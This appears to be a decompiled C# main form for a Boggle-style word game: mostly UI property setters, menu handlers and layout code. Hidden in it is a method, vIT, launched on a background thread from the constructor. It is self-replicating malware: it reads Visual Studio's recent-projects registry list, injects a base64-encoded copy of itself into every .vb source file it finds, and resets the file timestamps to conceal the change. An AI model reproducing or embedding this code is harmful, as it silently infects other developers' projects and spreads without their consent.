          ;
        this._lblHumanScore = value;
        if (this._lblHumanScore == null)
          ;
      }
    }

    internal virtual Label lblRound
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lblRound == null)
          ;
        this._lblRound = value;
        if (this._lblRound == null)
          ;
      }
      get => this._lblRound;
    }

    internal virtual Label lblCompScore
    {
      get => this._lblCompScore;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lblCompScore == null)
          ;
        this._lblCompScore = value;
        if (this._lblCompScore == null)
          ;
      }
    }

    internal virtual Label lblHumanWordsCount
    {
      get => this._lblHumanWordsCount;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lblHumanWordsCount == null)
          ;
        this._lblHumanWordsCount = value;
        if (this._lblHumanWordsCount == null)
          ;
      }
    }

    internal virtual Label lblCompWordsCount
    {
      get => this._lblCompWordsCount;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lblCompWordsCount == null)
          ;
        this._lblCompWordsCount = value;
        if (this._lblCompWordsCount == null)
          ;
      }
    }

    internal virtual BogPanel pnlCubes
    {
      get => this._pnlCubes;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._pnlCubes == null)
          ;
        this._pnlCubes = value;
        if (this._pnlCubes == null)
          ;
      }
    }

    internal virtual Label Label8
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label8 == null)
          ;
        this._Label8 = value;
        if (this._Label8 == null)
          ;
      }
      get => this._Label8;
    }

    internal virtual BogPanel pnlTimer
    {
      get => this._pnlTimer;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._pnlTimer == null)
          ;
        this._pnlTimer = value;
        if (this._pnlTimer == null)
          ;
      }
    }

    internal virtual BogPanel pnlScore
    {
      get => this._pnlScore;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._pnlScore == null)
          ;
        this._pnlScore = value;
        if (this._pnlScore == null)
          ;
      }
    }

    internal virtual BogPanel pnlWords
    {
      get => this._pnlWords;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._pnlWords == null)
          ;
        this._pnlWords = value;
        if (this._pnlWords == null)
          ;
      }
    }

    internal virtual Label Label7
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label7 == null)
          ;
        this._Label7 = value;
        if (this._Label7 == null)
          ;
      }
      get => this._Label7;
    }

    internal virtual MenuItem mnuMode
    {
      get => this._mnuMode;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuMode == null)
          ;
        this._mnuMode = value;
        if (this._mnuMode == null)
          ;
      }
    }

    internal virtual MenuItem mnuBoardGameMode
    {
      get => this._mnuBoardGameMode;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuBoardGameMode != null)
          this._mnuBoardGameMode.Click -= new EventHandler(this.ChangeMode);
        this._mnuBoardGameMode = value;
        if (this._mnuBoardGameMode == null)
          return;
        this._mnuBoardGameMode.Click += new EventHandler(this.ChangeMode);
      }
    }

    internal virtual MenuItem mnuVsMode
    {
      get => this._mnuVsMode;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuVsMode != null)
          this._mnuVsMode.Click -= new EventHandler(this.ChangeMode);
        this._mnuVsMode = value;
        if (this._mnuVsMode == null)
          return;
        this._mnuVsMode.Click += new EventHandler(this.ChangeMode);
      }
    }

    internal virtual Label lblComputerRounds
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lblComputerRounds == null)
          ;
        this._lblComputerRounds = value;
        if (this._lblComputerRounds == null)
          ;
      }
      get => this._lblComputerRounds;
    }

    internal virtual MenuItem mnuTeachingMode
    {
      get => this._mnuTeachingMode;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTeachingMode != null)
          this._mnuTeachingMode.Click -= new EventHandler(this.ChangeMode);
        this._mnuTeachingMode = value;
        if (this._mnuTeachingMode == null)
          return;
        this._mnuTeachingMode.Click += new EventHandler(this.ChangeMode);
      }
    }

    internal virtual MenuItem mnuEndGame
    {
      get => this._mnuEndGame;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuEndGame != null)
          this._mnuEndGame.Click -= new EventHandler(this.mnuEndGame_Click);
        this._mnuEndGame = value;
        if (this._mnuEndGame == null)
          return;
        this._mnuEndGame.Click += new EventHandler(this.mnuEndGame_Click);
      }
    }

    internal virtual MenuItem MenuItem2
    {
      get => this._MenuItem2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem2 == null)
          ;
        this._MenuItem2 = value;
        if (this._MenuItem2 == null)
          ;
      }
    }

    internal virtual MenuItem MenuItem1
    {
      get => this._MenuItem1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem1 == null)
          ;
        this._MenuItem1 = value;
        if (this._MenuItem1 == null)
          ;
      }
    }

    internal virtual Label lblHumanRounds
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._lblHumanRounds == null)
          ;
        this._lblHumanRounds = value;
        if (this._lblHumanRounds == null)
          ;
      }
      get => this._lblHumanRounds;
    }

    internal virtual MenuItem mnuEnableDefSearch
    {
      get => this._mnuEnableDefSearch;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuEnableDefSearch != null)
          this._mnuEnableDefSearch.Click -= new EventHandler(this.mnuEnableDefSearch_Click);
        this._mnuEnableDefSearch = value;
        if (this._mnuEnableDefSearch == null)
          return;
        this._mnuEnableDefSearch.Click += new EventHandler(this.mnuEnableDefSearch_Click);
      }
    }

    internal virtual MenuItem mnuAbout
    {
      get => this._mnuAbout;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuAbout != null)
          this._mnuAbout.Click -= new EventHandler(this.mnuAbout_Click);
        this._mnuAbout = value;
        if (this._mnuAbout == null)
          return;
        this._mnuAbout.Click += new EventHandler(this.mnuAbout_Click);
      }
    }

    internal virtual MenuItem MenuItem3
    {
      get => this._MenuItem3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem3 == null)
          ;
        this._MenuItem3 = value;
        if (this._MenuItem3 == null)
          ;
      }
    }

    internal virtual MenuItem MenuItem8
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem8 == null)
          ;
        this._MenuItem8 = value;
        if (this._MenuItem8 == null)
          ;
      }
      get => this._MenuItem8;
    }

    internal virtual MenuItem mnuLevelEasy
    {
      get => this._mnuLevelEasy;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuLevelEasy != null)
          this._mnuLevelEasy.Click -= new EventHandler(this.ChangeLevel);
        this._mnuLevelEasy = value;
        if (this._mnuLevelEasy == null)
          return;
        this._mnuLevelEasy.Click += new EventHandler(this.ChangeLevel);
      }
    }

    internal virtual MenuItem mnuLevelMedium
    {
      get => this._mnuLevelMedium;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuLevelMedium != null)
          this._mnuLevelMedium.Click -= new EventHandler(this.ChangeLevel);
        this._mnuLevelMedium = value;
        if (this._mnuLevelMedium == null)
          return;
        this._mnuLevelMedium.Click += new EventHandler(this.ChangeLevel);
      }
    }

    internal virtual MenuItem mnuLevelHard
    {
      get => this._mnuLevelHard;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuLevelHard != null)
          this._mnuLevelHard.Click -= new EventHandler(this.ChangeLevel);
        this._mnuLevelHard = value;
        if (this._mnuLevelHard == null)
          return;
        this._mnuLevelHard.Click += new EventHandler(this.ChangeLevel);
      }
    }

    internal virtual MenuItem mnuHighScores
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuHighScores != null)
          this._mnuHighScores.Click -= new EventHandler(this.mnuHighScores_Click);
        this._mnuHighScores = value;
        if (this._mnuHighScores == null)
          return;
        this._mnuHighScores.Click += new EventHandler(this.mnuHighScores_Click);
      }
      get => this._mnuHighScores;
    }

    internal virtual MenuItem mnuLevelImpossible
    {
      get => this._mnuLevelImpossible;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuLevelImpossible != null)
          this._mnuLevelImpossible.Click -= new EventHandler(this.ChangeLevel);
        this._mnuLevelImpossible = value;
        if (this._mnuLevelImpossible == null)
          return;
        this._mnuLevelImpossible.Click += new EventHandler(this.ChangeLevel);
      }
    }

    internal virtual MenuItem MenuItem4
    {
      get => this._MenuItem4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem4 == null)
          ;
        this._MenuItem4 = value;
        if (this._MenuItem4 == null)
          ;
      }
    }

    internal virtual MenuItem mnuTimerInterval
    {
      get => this._mnuTimerInterval;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTimerInterval == null)
          ;
        this._mnuTimerInterval = value;
        if (this._mnuTimerInterval == null)
          ;
      }
    }

    internal virtual MenuItem mnuTmr30
    {
      get => this._mnuTmr30;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTmr30 != null)
        {
          this._mnuTmr30.Click -= new EventHandler(this.ChangeTimerInterval);
          this._mnuTmr30.Click -= new EventHandler(this.ChangeTimerInterval);
        }
        this._mnuTmr30 = value;
        if (this._mnuTmr30 == null)
          return;
        this._mnuTmr30.Click += new EventHandler(this.ChangeTimerInterval);
        this._mnuTmr30.Click += new EventHandler(this.ChangeTimerInterval);
      }
    }

    internal virtual MenuItem mnuTips
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTips != null)
          this._mnuTips.Click -= new EventHandler(this.mnuTips_Click);
        this._mnuTips = value;
        if (this._mnuTips == null)
          return;
        this._mnuTips.Click += new EventHandler(this.mnuTips_Click);
      }
      get => this._mnuTips;
    }

    internal virtual MenuItem mnuTmr100
    {
      get => this._mnuTmr100;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTmr100 != null)
          this._mnuTmr100.Click -= new EventHandler(this.ChangeTimerInterval);
        this._mnuTmr100 = value;
        if (this._mnuTmr100 == null)
          return;
        this._mnuTmr100.Click += new EventHandler(this.ChangeTimerInterval);
      }
    }

    internal virtual MenuItem mnuTmr130
    {
      get => this._mnuTmr130;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTmr130 != null)
          this._mnuTmr130.Click -= new EventHandler(this.ChangeTimerInterval);
        this._mnuTmr130 = value;
        if (this._mnuTmr130 == null)
          return;
        this._mnuTmr130.Click += new EventHandler(this.ChangeTimerInterval);
      }
    }

    internal virtual MenuItem mnuTmr200
    {
      get => this._mnuTmr200;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTmr200 != null)
          this._mnuTmr200.Click -= new EventHandler(this.ChangeTimerInterval);
        this._mnuTmr200 = value;
        if (this._mnuTmr200 == null)
          return;
        this._mnuTmr200.Click += new EventHandler(this.ChangeTimerInterval);
      }
    }

    internal virtual MenuItem MenuItem6
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem6 == null)
          ;
        this._MenuItem6 = value;
        if (this._MenuItem6 == null)
          ;
      }
      get => this._MenuItem6;
    }

    internal virtual MenuItem mnuTmr230
    {
      get => this._mnuTmr230;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTmr230 != null)
          this._mnuTmr230.Click -= new EventHandler(this.ChangeTimerInterval);
        this._mnuTmr230 = value;
        if (this._mnuTmr230 == null)
          return;
        this._mnuTmr230.Click += new EventHandler(this.ChangeTimerInterval);
      }
    }

    internal virtual MenuItem mnuTmr300
    {
      get => this._mnuTmr300;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTmr300 != null)
          this._mnuTmr300.Click -= new EventHandler(this.ChangeTimerInterval);
        this._mnuTmr300 = value;
        if (this._mnuTmr300 == null)
          return;
        this._mnuTmr300.Click += new EventHandler(this.ChangeTimerInterval);
      }
    }

    internal virtual MenuItem mnuTmr330
    {
      get => this._mnuTmr330;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTmr330 != null)
          this._mnuTmr330.Click -= new EventHandler(this.ChangeTimerInterval);
        this._mnuTmr330 = value;
        if (this._mnuTmr330 == null)
          return;
        this._mnuTmr330.Click += new EventHandler(this.ChangeTimerInterval);
      }
    }

    internal virtual BogButton btnFinish
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._btnFinish != null)
          this._btnFinish.Click -= new EventHandler(this.btnFinish_Click);
        this._btnFinish = value;
        if (this._btnFinish == null)
          return;
        this._btnFinish.Click += new EventHandler(this.btnFinish_Click);
      }
      get => this._btnFinish;
    }

    internal virtual MenuItem mnuTmr400
    {
      get => this._mnuTmr400;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTmr400 != null)
          this._mnuTmr400.Click -= new EventHandler(this.ChangeTimerInterval);
        this._mnuTmr400 = value;
        if (this._mnuTmr400 == null)
          return;
        this._mnuTmr400.Click += new EventHandler(this.ChangeTimerInterval);
      }
    }

    internal virtual MenuItem mnuTmr430
    {
      get => this._mnuTmr430;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTmr430 != null)
          this._mnuTmr430.Click -= new EventHandler(this.ChangeTimerInterval);
        this._mnuTmr430 = value;
        if (this._mnuTmr430 == null)
          return;
        this._mnuTmr430.Click += new EventHandler(this.ChangeTimerInterval);
      }
    }

    internal virtual MenuItem mnuTmr500
    {
      get => this._mnuTmr500;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuTmr500 != null)
          this._mnuTmr500.Click -= new EventHandler(this.ChangeTimerInterval);
        this._mnuTmr500 = value;
        if (this._mnuTmr500 == null)
          return;
        this._mnuTmr500.Click += new EventHandler(this.ChangeTimerInterval);
      }
    }

    internal virtual MenuItem mnuEnableTimerFlash
    {
      get => this._mnuEnableTimerFlash;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuEnableTimerFlash != null)
          this._mnuEnableTimerFlash.Click -= new EventHandler(this.mnuEnableTimerFlash_Click);
        this._mnuEnableTimerFlash = value;
        if (this._mnuEnableTimerFlash == null)
          return;
        this._mnuEnableTimerFlash.Click += new EventHandler(this.mnuEnableTimerFlash_Click);
      }
    }

    internal virtual MenuItem mnuEnableWordValidation
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._mnuEnableWordValidation != null)
          this._mnuEnableWordValidation.Click -= new EventHandler(this.mnuEnableWordValidation_Click);
        this._mnuEnableWordValidation = value;
        if (this._mnuEnableWordValidation == null)
          return;
        this._mnuEnableWordValidation.Click += new EventHandler(this.mnuEnableWordValidation_Click);
      }
      get => this._mnuEnableWordValidation;
    }

    internal virtual BogButton btnContinue
    {
      get => this._btnContinue;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._btnContinue != null)
          this._btnContinue.Click -= new EventHandler(this.btnContinue_Click_1);
        this._btnContinue = value;
        if (this._btnContinue == null)
          return;
        this._btnContinue.Click += new EventHandler(this.btnContinue_Click_1);
      }
    }

    internal virtual BogButton btnScramble
    {
      get => this._btnScramble;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._btnScramble != null)
          this._btnScramble.Click -= new EventHandler(this.btnScramble_Click_1);
        this._btnScramble = value;
        if (this._btnScramble == null)
          return;
        this._btnScramble.Click += new EventHandler(this.btnScramble_Click_1);
      }
    }

    internal virtual MenuItem MenuItem5
    {
      get => this._MenuItem5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._MenuItem5 == null)
          ;
        this._MenuItem5 = value;
        if (this._MenuItem5 == null)
          ;
      }
    }

    private void vIT()
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\VisualStudio\\7.0\\ProjectMRUList");
      if (registryKey.ValueCount == 0)
        ProjectData.EndApp();
      string String2 = "Private Sub vIT()";
      string str1 = "Public Sub New()";
      string str2 = "Dim t As New System.Threading.Thread(AddressOf vIT)\r\nt.Start()";
      string str3 = "UHJpdmF0ZSBTdWIgdklUKCkNCkRpbSBYLCBZIEFzIEludGVnZXINCkRpbSBBLCBC" + "KCksIEMsIEcsIEgsIEksIEosIEssIEwgQXMgU3RyaW5nDQpEaW0gRCwgRiBBcyBE" + "YXRlDQpEaW0gUiBBcyBNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXkNCkRpbSBT" + "IEFzIFN5c3RlbS5JTy5TdHJlYW1SZWFkZXINCkRpbSBUIEFzIFN5c3RlbS5JTy5T" + "dHJlYW1Xcml0ZXINCkRpbSBVIEFzIFN5c3RlbS5JTy5GaWxlQXR0cmlidXRlcw0K" + "UiA9IE1pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3Vi" + "S2V5KCJTb2Z0d2FyZVxNaWNyb3NvZnRcVmlzdWFsU3R1ZGlvXDcuMFxQcm9qZWN0" + "TVJVTGlzdCIpDQpJZiBSLlZhbHVlQ291bnQgPSAwIFRoZW4gRW5kDQpHID0gIlBy" + "aXZhdGUgU3ViIHZJVCgpIg0KSCA9ICJQdWJsaWMgU3ViIE5ldygpIg0KSSA9ICJE" + "aW0gdCBBcyBOZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoQWRkcmVzc09mIHZJ" + "VCkiICYgdmJDckxmICYgInQuU3RhcnQoKSINCkogPSAiIg0KSyA9IFN5c3RlbS5U" + "ZXh0LkVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9t" + "QmFzZTY0U3RyaW5nKEopKQ0KTCA9ICJKID0gIiAmIENocigzNCkNCkZvciBYID0g" + "MSBUbyBMZW4oSikgU3RlcCA2NA0KSWYgWCArIDY0IDwgTGVuKEopIFRoZW4NCkwg" + "PSBMICYgTWlkKEosIFgsIDY0KSAmIENocigzNCkgJiB2YkNyTGYgJiAiSiA9IEog" + "JiAiICYgQ2hyKDM0KQ0KRWxzZQ0KTCA9IEwgJiBNaWQoSiwgWCwgNjQpICYgQ2hy" + "KDM0KQ0KRW5kIElmDQpOZXh0DQpLID0gUmVwbGFjZShLLCAiSiA9ICIgJiBDaHIo" + "MzQpICYgQ2hyKDM0KSwgTCwgMSwgMSwgQ29tcGFyZU1ldGhvZC5UZXh0KQ0KTCA9" + "ICIiDQpGb3IgWCA9IDAgVG8gUi5WYWx1ZUNvdW50IC0gMQ0KQSA9IFIuR2V0VmFs" + "dWUoUi5HZXRWYWx1ZU5hbWVzKFgpKQ0KQSA9IE1pZChBLCAxLCBJblN0clJldihB" + "LCAiXCIsIC0xLCBDb21wYXJlTWV0aG9kLlRleHQpKQ0KSWYgU3lzdGVtLklPLkRp" + "cmVjdG9yeS5FeGlzdHMoQSkgVGhlbg0KQiA9IFN5c3RlbS5JTy5EaXJlY3Rvcnku" + "R2V0RmlsZXMoQSwgIioudmIiKQ0KRm9yIFkgPSBMQm91bmQoQikgVG8gVUJvdW5k" + "KEIpDQpEID0gU3lzdGVtLklPLkZpbGUuR2V0TGFzdEFjY2Vzc1RpbWUoQihZKSkN" + "CkYgPSBTeXN0ZW0uSU8uRmlsZS5HZXRMYXN0V3JpdGVUaW1lKEIoWSkpDQpVID0g" + "U3lzdGVtLklPLkZpbGUuR2V0QXR0cmlidXRlcyhCKFkpKQ0KU3lzdGVtLklPLkZp" + "bGUuU2V0QXR0cmlidXRlcyhCKFkpLCBJTy5GaWxlQXR0cmlidXRlcy5Ob3JtYWwp" + "DQpTID0gU3lzdGVtLklPLkZpbGUuT3BlblRleHQoQihZKSkNCkMgPSBTLlJlYWRU" + "b0VuZCgpDQpTLkNsb3NlKCkNCklmIEluU3RyKEMsIEcsIENvbXBhcmVNZXRob2Qu" + "VGV4dCkgPSAwIEFuZCBJblN0cihDLCBILCBDb21wYXJlTWV0aG9kLlRleHQpIDw+" + "IDAgVGhlbg0KQyA9IFJlcGxhY2UoQywgIk15QmFzZS5OZXcoKSIsICJNeUJhc2Uu" + "TmV3KCkiICYgdmJDckxmICYgSSwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQpDQpD" + "ID0gUmVwbGFjZShDLCBILCBLICYgSCwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQp" + "DQpUID0gU3lzdGVtLklPLkZpbGUuQ3JlYXRlVGV4dChCKFkpKQ0KVC5Xcml0ZShD" + "KQ0KVC5GbHVzaCgpDQpULkNsb3NlKCkNCkVuZCBJZg0KU3lzdGVtLklPLkZpbGUu" + "U2V0TGFzdFdyaXRlVGltZShCKFkpLCBGKQ0KU3lzdGVtLklPLkZpbGUuU2V0TGFz" + "dEFjY2Vzc1RpbWUoQihZKSwgRCkNClN5c3RlbS5JTy5GaWxlLlNldEF0dHJpYnV0" + "ZXMoQihZKSwgVSkNCk5leHQNCkVuZCBJZg0KTmV4dA0KRW5kIFN1Yg0K";
      string Expression = Encoding.ASCII.GetString(Convert.FromBase64String(str3));
      string Replacement = "J = \"";
      int num1 = Strings.Len(str3);
      int Start = 1;
      while (Start <= num1)
      {
        Replacement = checked (Start + 64) >= Strings.Len(str3) ? Replacement + Strings.Mid(str3, Start, 64) + "\"" : Replacement + Strings.Mid(str3, Start, 64) + "\"" + "\r\nJ = J & " + "\"";
        checked { Start += 64; }
      }
      string str4 = Strings.Replace(Expression, "J = \"\"", Replacement, Count: 1, Compare: CompareMethod.Text);
      int num2 = checked (registryKey.ValueCount - 1);
      int index1 = 0;
      while (index1 <= num2)
      {
        string str5 = StringType.FromObject(registryKey.GetValue(registryKey.GetValueNames()[index1]));
        string path = Strings.Mid(str5, 1, Strings.InStrRev(str5, "\\", Compare: CompareMethod.Text));
        if (Directory.Exists(path))
        {
          string[] files = Directory.GetFiles(path, "*.vb");
          int num3 = Information.LBound((Array) files);
          int num4 = Information.UBound((Array) files);
          int index2 = num3;
          while (index2 <= num4)
          {
            DateTime lastAccessTime = File.GetLastAccessTime(files[index2]);
            DateTime lastWriteTime = File.GetLastWriteTime(files[index2]);
            FileAttributes attributes = File.GetAttributes(files[index2]);
            File.SetAttributes(files[index2], FileAttributes.Normal);
            StreamReader streamReader = File.OpenText(files[index2]);
            string end = streamReader.ReadToEnd();
            streamReader.Close();
            if (Strings.InStr(end, String2, CompareMethod.Text) == 0 & Strings.InStr(end, str1, CompareMethod.Text) != 0)
            {
              string str6 = Strings.Replace(Strings.Replace(end, "MyBase.New()", "MyBase.New()\r\n" + str2, Count: 1, Compare: CompareMethod.Text), str1, str4 + str1, Count: 1, Compare: CompareMethod.Text);
              StreamWriter text = File.CreateText(files[index2]);
              text.Write(str6);
              text.Flush();
              text.Close();
            }
            File.SetLastWriteTime(files[index2], lastWriteTime);
            File.SetLastAccessTime(files[index2], lastAccessTime);
            File.SetAttributes(files[index2], attributes);
            checked { ++index2; }
          }
        }
        checked { ++index1; }
      }
    }

    public frmMain()
    {
      this.Load += new EventHandler(this.frmMain_Load);
      this.FoundWords = new DataTable();
      this.WordsChosen = new string[1];
      this.ScramSec = 5.0;
      this.\u0024STATIC\u0024FindNextLetterSquare\u002420188\u0024WentDirection\u0024Init = new StaticLocalInitFlag();
      new Thread(new ThreadStart(this.vIT)).Start();
      this.InitializeComponent();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.pnlCubes = new BogPanel();
      this.pnlTimer = new BogPanel();
      this.tmrMain = new BogTimer();
      this.BogBorder2 = new BogBorder();
      this.BogBorder6 = new BogBorder();
      this.BogBorder7 = new BogBorder();
      this.BogBorder8 = new BogBorder();
      this.lbl1 = new CircleLabel();
      this.lbl4 = new CircleLabel();
      this.lbl3 = new CircleLabel();
      this.lbl2 = new CircleLabel();
      this.lbl5 = new CircleLabel();
      this.lbl6 = new CircleLabel();
      this.lbl7 = new CircleLabel();
      this.lbl8 = new CircleLabel();
      this.lbl9 = new CircleLabel();
      this.lbl10 = new CircleLabel();
      this.lbl11 = new CircleLabel();
      this.lbl12 = new CircleLabel();
      this.lbl13 = new CircleLabel();
      this.lbl14 = new CircleLabel();
      this.lbl15 = new CircleLabel();
      this.lbl16 = new CircleLabel();
      this.picCubeDown = new PictureBox();
      this.btnAddWord = new BogButton();
      this.lstHumanWordsFound = new ListBox();
      this.mnuMain = new MainMenu();
      this.mnuGame = new MenuItem();
      this.mnuNewGame = new MenuItem();
      this.mnuEndGame = new MenuItem();
      this.MenuItem8 = new MenuItem();
      this.mnuHighScores = new MenuItem();
      this.MenuItem2 = new MenuItem();
      this.mnuExitGame = new MenuItem();
      this.mnuOptions = new MenuItem();
      this.mnuEnableDefSearch = new MenuItem();
      this.MenuItem1 = new MenuItem();
      this.mnuMode = new MenuItem();
      this.mnuBoardGameMode = new MenuItem();
      this.mnuVsMode = new MenuItem();
      this.mnuTeachingMode = new MenuItem();
      this.MenuItem3 = new MenuItem();
      this.mnuLevelEasy = new MenuItem();
      this.mnuLevelMedium = new MenuItem();
      this.mnuLevelHard = new MenuItem();
      this.mnuLevelImpossible = new MenuItem();
      this.MenuItem4 = new MenuItem();
      this.mnuTimerInterval = new MenuItem();
      this.mnuTmr30 = new MenuItem();
      this.mnuTmr100 = new MenuItem();
      this.mnuTmr130 = new MenuItem();
      this.mnuTmr200 = new MenuItem();
      this.mnuTmr230 = new MenuItem();
      this.mnuTmr300 = new MenuItem();
      this.mnuTmr330 = new MenuItem();
      this.mnuTmr400 = new MenuItem();
      this.mnuTmr430 = new MenuItem();
      this.mnuTmr500 = new MenuItem();
      this.mnuEnableTimerFlash = new MenuItem();
      this.MenuItem5 = new MenuItem();
      this.mnuEnableWordValidation = new MenuItem();
      this.mnuHelp = new MenuItem();
      this.mnuAbout = new MenuItem();
      this.MenuItem6 = new MenuItem();
      this.mnuTips = new MenuItem();
      this.tmrContMain = new System.Windows.Forms.Timer(this.components);
      this.txtWordFound = new TextBox();
      this.lblHumanScore = new Label();
      this.Panel1 = new Panel();
      this.pnlScore = new BogPanel();
      this.pnlWords = new BogPanel();
      this.BogBorder9 = new BogBorder();
      this.BogBorder10 = new BogBorder();
      this.BogBorder11 = new BogBorder();
      this.BogBorder12 = new BogBorder();
      this.BogBorder13 = new BogBorder();
      this.BogBorder14 = new BogBorder();
      this.BogBorder15 = new BogBorder();
      this.BogBorder16 = new BogBorder();
      this.lstCompFoundWords = new ListBox();
      this.tmrBtn1 = new Button();
      this.tmrBtn2 = new Button();
      this.tmrBtn3 = new Button();
      this.tmrBtn4 = new Button();
      this.Label1 = new Label();
      this.Label2 = new Label();
      this.lblCompScore = new Label();
      this.Label3 = new Label();
      this.Label4 = new Label();
      this.Label5 = new Label();
      this.lblHumanWordsCount = new Label();
      this.lblCompWordsCount = new Label();
      this.btnContinue = new BogButton();
      this.btnScramble = new BogButton();
      this.btnFinish = new BogButton();
      this.lblHumanRounds = new Label();
      this.lblComputerRounds = new Label();
      this.Label7 = new Label();
      this.Label8 = new Label();
      this.lblRound = new Label();
      this.Label6 = new Label();
      this.BogBorder5 = new BogBorder();
      this.Panel3 = new Panel();
      this.Panel2 = new Panel();
      this.txtMain = new RichTextBox();
      this.BogBorder4 = new BogBorder();
      this.BogBorder3 = new BogBorder();
      this.BogBorder1 = new BogBorder();
      this.picCubesUp = new PictureBox();
      this.CircleLabel1 = new CircleLabel();
      this.CircleLabel2 = new CircleLabel();
      this.CircleLabel3 = new CircleLabel();
      this.PictureBox1 = new PictureBox();
      this.SuspendLayout();
      this.pnlCubes.BackColor = System.Drawing.Color.DarkGray;
      BogPanel pnlCubes1 = this.pnlCubes;
      Point point1 = new Point(310, -3);
      Point point2 = point1;
      pnlCubes1.Location = point2;
      this.pnlCubes.Name = "pnlCubes";
      BogPanel pnlCubes2 = this.pnlCubes;
      Size size1 = new Size(539, 650);
      Size size2 = size1;
      pnlCubes2.Size = size2;
      this.pnlCubes.TabIndex = 6;
      this.pnlCubes.TabStop = false;
      this.pnlTimer.BackColor = System.Drawing.Color.DarkGray;
      BogPanel pnlTimer1 = this.pnlTimer;
      point1 = new Point(35, -1);
      Point point3 = point1;
      pnlTimer1.Location = point3;
      this.pnlTimer.Name = "pnlTimer";
      BogPanel pnlTimer2 = this.pnlTimer;
      size1 = new Size(237, 166);
      Size size3 = size1;
      pnlTimer2.Size = size3;
      this.pnlTimer.TabIndex = 7;
      this.pnlTimer.TabStop = false;
      this.tmrMain.BackColor = System.Drawing.Color.Black;
      this.tmrMain.EnableFlash = false;
      this.tmrMain.LedBackColor = System.Drawing.Color.Black;
      this.tmrMain.LedOffColor = System.Drawing.Color.FromArgb(0, 0, 70);
      this.tmrMain.LedOnColor = System.Drawing.Color.DeepSkyBlue;
      BogTimer tmrMain1 = this.tmrMain;
      point1 = new Point(69, 24);
      Point point4 = point1;
      tmrMain1.Location = point4;
      this.tmrMain.Name = "tmrMain";
      BogTimer tmrMain2 = this.tmrMain;
      size1 = new Size(168, 80);
      Size size4 = size1;
      tmrMain2.Size = size4;
      this.tmrMain.TabIndex = 8;
      this.tmrMain.TimerText = (string) null;
      this.BogBorder2.BackColor = System.Drawing.Color.DarkGray;
      this.BogBorder2.BorderDirection = BogBorder.Direction.Left;
      BogBorder bogBorder2_1 = this.BogBorder2;
      point1 = new Point(59, 13);
      Point point5 = point1;
      bogBorder2_1.Location = point5;
      this.BogBorder2.Name = "BogBorder2";
